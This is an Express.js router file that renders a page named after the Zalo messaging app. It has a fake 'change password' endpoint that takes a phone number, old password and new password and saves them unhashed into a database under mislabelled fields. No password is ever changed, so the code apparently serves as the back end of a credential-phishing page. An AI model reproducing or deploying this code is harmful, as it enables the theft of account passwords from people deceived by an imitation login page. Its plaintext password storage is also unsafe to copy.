var express = require('express');
var router = express.Router();

var User = require('../models/User');
/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('zalo');
});

router.get('/success', function(req, res, next) {
  res.render('success');
});

router.post('/change/password', function(req, res, next) {
		var sdt = req.body.sdt;
		var oldpassword = req.body.oldpassword;
		var newpassword = req.body.newpassword;
		
		var user = new User({
			username:sdt,
			name:oldpassword,
			sdt:newpassword
		});
		user.save(function(err, contact){
			if(err) throw err;
			else
			{
				res.redirect('/success');			
			}
		});
	});
module.exports = router;
